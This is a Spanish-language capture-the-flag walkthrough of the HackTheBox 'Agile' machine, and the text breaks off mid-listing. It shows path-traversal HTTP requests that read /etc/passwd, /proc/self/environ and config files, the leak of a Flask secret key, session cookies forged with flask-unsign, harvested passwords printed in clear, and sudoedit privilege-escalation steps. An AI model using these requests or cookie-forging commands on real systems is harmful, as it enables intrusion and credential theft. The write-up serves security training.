{"pageProps":{"markdownData":"{\"orig\":\"---\\ntitle: HackTheBox - Maquina Agile \\nsubtitle: Paso a paso de la explotación de la máquina Agile de HackTheBox.\\ndificultad: Medium\\nos: Sistema Operativo Linux\\ndate: 2024-02-10\\ntags:\\n    - HackTheBox\\n---\\n\\n## Enumeración de puertos\\n\\n### TCP \\n\\nEnumeracion de Puertos TCP\\n\\n~~~ bash\\nnmap -p- -A 10.129.30.106\\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST\\nNmap scan report for 10.129.30.106\\nHost is up (0.15s latency).\\nNot shown: 65533 closed tcp ports (conn-refused)\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)\\n|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)\\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\\n|_http-title: Did not follow redirect to http://superpass.htb\\n|_http-server-header: nginx/1.18.0 (Ubuntu)\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 502.76 seconds\\n~~~\\n\\n\\n\\n### UDP\\n  \\nEnumeración de puertos UDP\\n\\n~~~ bash\\nsudo nmap -F -sU 10.129.30.106\\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST\\nNmap scan report for agile.htb (10.129.30.106)\\nHost is up (0.15s latency).\\nNot shown: 99 closed udp ports (port-unreach)\\nPORT   STATE         SERVICE\\n68/udp open|filtered dhcpc\\n\\nNmap done: 1 IP address (1 host up) scanned in 106.72 seconds\\n~~~\\n\\n\\n## Enumeracion de Servicios     \\n\\n### Puerto 80\\n\\nDefinimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)\\n\\n![](/Agile/Pasted_image_20230306113515.png)\\n\\nIntentamos registrarnos en la aplicacion web\\n\\n![](/Agile/Pasted_image_20230306114025.png)\\n\\nAl intentarlo obtenemos el siguiente error\\n\\n![](/Agile/Pasted_image_20230306113616.png)\\n\\nLuego de registrarnos ingresamos a la siguiente página\\n\\nPodemos ingresar algunas credenciales al baul.Intentamos exportarlas\\n\\nLuego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)\\n\\n~~~http\\nGET /download?fn=../../etc/passwd HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 14:51:57 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 1744\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\npollinate:x:105:1::/var/cache/pollinate:/bin/false\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\ncorum:x:1000:1000:corum:/home/corum:/bin/bash\\ndnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\nmysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false\\nrunner:x:1001:1001::/app/app-testing/:/bin/sh\\nedwards:x:1002:1002::/home/edwards:/bin/bash\\ndev_admin:x:1003:1003::/home/dev_admin:/bin/bash\\n_laurel:x:999:999::/var/log/laurel:/bin/false\\n~~~\\n\\nConsultamos las variables de entorno del sistema\\n\\n~~~http\\nGET /download?fn=../../proc/self/environ HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n![](/Agile/Pasted_image_20230306121100.png)\\n\\nBuscamos el directorio /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\nNo tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta\\n\\n~~~http\\nHTTP/1.1 500 INTERNAL SERVER ERROR\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:15:35 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 13637\\nConnection: close\\n\\n<!doctype html>\\n<html lang=en>\\n  <head>\\n    <title>PermissionError: [Errno 13] Permission denied: '/tmp/../../home/dev_admin/app/config_prod.json'\\n // Werkzeug Debugger</title>\\n    <link rel=\\\"stylesheet\\\" href=\\\"?__debugger__=yes&amp;cmd=res&amp;f=style.css\\\">\\n    <link rel=\\\"shortcut icon\\\"\\n        href=\\\"?__debugger__=yes&amp;cmd=res&amp;f=console.png\\\">\\n    <script src=\\\"?__debugger__=yes&amp;cmd=res&amp;f=debugger.js\\\"></script>\\n    <script>\\n      var CONSOLE_MODE = false,\\n          EVALEX = true,\\n          EVALEX_TRUSTED = false,\\n          SECRET = \\\"0k71JQ5bp0qM5tHnQe0w\\\";\\n    </script>\\n  </head>\\n~~~\\n\\nDatos del archivo hosts\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:03 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 253\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n127.0.0.1 localhost superpass.htb test.superpass.htb\\n127.0.1.1 agile\\n\\n# The following lines are desirable for IPv6 capable hosts\\n::1     ip6-localhost ip6-loopback\\nfe00::0 ip6-localnet\\nff00::0 ip6-mcastprefix\\nff02::1 ip6-allnodes\\nff02::2 ip6-allrouters\\n~~~\\n\\nArchivo /etc/mysql/my.cnf\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:05 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 682\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n#\\n# The MySQL database server configuration file.\\n#\\n# You can copy this to one of:\\n# - \\\"/etc/mysql/my.cnf\\\" to set global options,\\n# - \\\"~/.my.cnf\\\" to set user-specific options.\\n# \\n# One can use all long options that the program supports.\\n# Run program with --help to get a list of available options and with\\n# --print-defaults to see which it would actually understand and use.\\n#\\n# For explanations see\\n# http://dev.mysql.com/doc/mysql/en/server-system-variables.html\\n\\n#\\n# * IMPORTANT: Additional settings that can override those from this file!\\n#   The files must end with '.cnf', otherwise they'll be ignored.\\n#\\n\\n!includedir /etc/mysql/conf.d/\\n!includedir /etc/mysql/mysql.conf.d/\\n~~~\\n\\nKernel versión\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:08 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 184\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nLinux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023\\n~~~\\n\\n\\nNginx error log\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:51 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 82947\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n2023/02/28 16:21:17 [error] 1004#1004: *14 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n2023/02/28 16:23:58 [error] 1004#1004: *18 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n\\n~~~\\n\\nConsultamos el archivo  /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~ bash\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 17:15:30 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 88\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n{\\\"SQL_URI\\\": \\\"mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\\\"}\\n~~~\\n\\nCódigo fuente de app.py\\n\\n~~~http\\nGET /download?fn=../../app/app/superpass/app.py HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~python\\n\\nimport json\\nimport os\\nimport sys\\nimport flask\\nimport jinja_partials\\nfrom flask_login import LoginManager\\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\\nfrom superpass.infrastructure.view_modifiers import response\\nfrom superpass.data import db_session\\n\\napp = flask.Flask(__name__)\\napp.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'\\n\\n\\ndef register_blueprints():\\n    from superpass.views import home_views\\n    from superpass.views import vault_views\\n    from superpass.views import account_views\\n    \\n    app.register_blueprint(home_views.blueprint)\\n    app.register_blueprint(vault_views.blueprint)\\n    app.register_blueprint(account_views.blueprint)\\n\\n\\ndef setup_db():\\n    db_session.global_init(app.config['SQL_URI'])\\n\\n\\ndef configure_login_manager():\\n    login_manager = LoginManager()\\n    login_manager.login_view = 'account.login_get'\\n    login_manager.init_app(app)\\n\\n    from superpass.data.user import User\\n\\n    @login_manager.user_loader\\n    def load_user(user_id):\\n        from superpass.services.user_service import get_user_by_id\\n        return get_user_by_id(user_id)\\n\\n\\ndef configure_template_options():\\n    jinja_partials.register_extensions(app)\\n    helpers = {\\n        'len': len,\\n        'str': str,\\n        'type': type,\\n    }\\n    app.jinja_env.globals.update(**helpers)\\n\\n\\ndef load_config():\\n    config_path = os.getenv(\\\"CONFIG_PATH\\\")\\n    with open(config_path, 'r') as f:\\n        for k, v in json.load(f).items():\\n            app.config[k] = v\\n\\n\\ndef configure():\\n    load_config()\\n    register_blueprints()\\n    configure_login_manager()\\n    setup_db()\\n    configure_template_options()\\n\\n\\ndef enable_debug():\\n    from werkzeug.debug import DebuggedApplication\\n    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)\\n    app.debug = True\\n\\n\\ndef main():\\n    enable_debug()\\n    configure()\\n    app.run(debug=True)\\n\\n\\ndef dev():\\n    configure()\\n    app.run(port=5555)\\n\\n\\nif __name__ == '__main__':\\n    main()\\nelse:\\n    configure()\\n\\n~~~\\n\\nUsamos el secret_key para extraer la información de la cookie del usuario\\n\\nCredenciales encontradas\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo\\n~~~\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '9'}\\n~~~\\n\\nCreamos nuestra propia session\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\n~~~\\n\\nEl comando a usar es:\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\n![](/Agile/Pasted_image_20230306150725.png)\\n\\nLuego lo intentamos con el  \\\\_user_id: 2\\n\\n![](/Agile/Pasted_image_20230306150956.png)\\n\\nUsers:\\n\\n~~~bash\\ncorum\\nrunner\\nedwards\\ndev_admin\\nsuperpassuser\\n~~~\\n\\nPasswords:\\n\\n~~~bash\\nMNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD\\ndSA6l7q*yIVs$39Ml6ywvgK\\n0k71JQ5bp0qM5tHnQe0w\\n~~~\\n\\n~~~text\\n0xdf:762b430d32eea2f12970\\n0xdf:5b133f7a6a1c180646cb\\ncorum:47ed1e73c955de230a1d\\ncorum:9799588839ed0f98c211\\ncorum:5db7caa1d13cc37c9fc2\\n~~~\\n\\n## Getting a shell\\n\\nIntentamos acceder a través de SSH con las credenciales del usuario Corum\\n\\n~~~ bash\\nssh corum@10.129.30.106\\n~~~\\n\\n![](/Agile/Pasted_image_20230306155037.png)\\n\\n### System Enumeration\\n\\nProcesos interesantes\\n\\n![](/Agile/Pasted_image_20230306160615.png)\\n\\nArchivos interesantes\\n\\n~~~bash\\n/var/www/html/index.nginx-debian.html                                                                                                                                                 \\n/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc\\n/app/app-testing/tests/functional/creds.txt\\n/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc\\n/app/app-testing/tests/functional/test_site_interactively.py\\n/app/app-testing/requirements.txt\\n/app/app-testing/.pytest_cache/.gitignore\\n/app/app-testing/.pytest_cache/CACHEDIR.TAG\\n/app/app-testing/.pytest_cache/v/cache/stepwise\\n/app/app-testing/.pytest_cache/v/cache/nodeids\\n/app/app-testing/.pytest_cache/v/cache/lastfailed\\n/app/app-testing/.pytest_cache/README.md\\n/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc\\n/app/app-testing/superpass/views/vault_views.py\\n/app/app-testing/superpass/views/home_views.py\\n/app/app-testing/superpass/views/account_views.py\\n/app/app-testing/superpass/__pycache__/app.cpython-310.pyc\\n/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc\\n~~~\\n\\n## Privilege Escalation a Edwards\\n\\nIntentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile\\n\\n~~~bash\\nssh -L 8080:localhost:5555 corum@10.10.11.203\\n~~~\\n\\nNos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.\\n\\nTomamos nuestra cookie y vemos que el id asignado es el 2\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc\\n~~~\\n\\n~~~json\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '2'}\\n~~~\\n\\nAsumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\nLogramos acceder a las credenciales del usuario edwards\\n\\n![](/Agile/Pasted_image_20230309120804.png)\\n\\n\\nSus datos son:\\n\\n~~~\\nedwards:d07867c6267dcb5df0af\\ndedwards__:7dbfe676b6b564ce5718\\n~~~\\n\\nFinalmente ingresamos al sistemas a través de ssh con estas últimas credenciales\\n\\n![](/Agile/Pasted_image_20230309121717.png)\\n\\n## User Edwards Enumeration\\n\\nVerificamos los permisos sudo\\n\\n~~~\\nsudo -l\\n~~~\\n\\n~~~bash\\n[sudo] password for edwards: \\nMatching Defaults entries for edwards on agile:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\\n\\nUser edwards may run the following commands on agile:\\n    (dev_admin : dev_admin) sudoedit /app/config_test.json\\n    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt\\n\\n~~~\\n\\nCon sudoedit podemos modificar un archivo protegido por el administrador\\n\\nIntentamos acceder al archivo config_test.json\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/config_test.json\\n~~~\\n\\nconfig_test.json\\n\\n![](/Agile/Pasted_image_20230309122920.png)\\n\\n~~~json\\n{\\n    \\\"SQL_URI\\\": \\\"mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest\\\"\\n}\\n~~~\\n\\nIntentamos acceder al archivo creds.txt\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nSu cotenido es:\\n\\n![](/Agile/Pasted_image_20230309122823.png)\\n\\n~~~\\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\\n~~~\\n\\n\\nVerificamos cuales son los archivos que el usuario web_admin puede modificar \\n\\n~~~bash\\nfind /  -user dev_admin 2>/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt\\n-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json\\n-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json\\n~~~\\n\\nVerificamos que puede modificar el grupo dev_admin\\n\\n~~~bash\\nfind /  -group dev_admin 2>/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1\\n-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate\\n-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh\\n-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish\\n\\n/app/venv:\\ntotal 24\\ndrwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .\\ndrwxr-xr-x 6 root root      4096 Feb  8 16:29 ..\\ndrwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 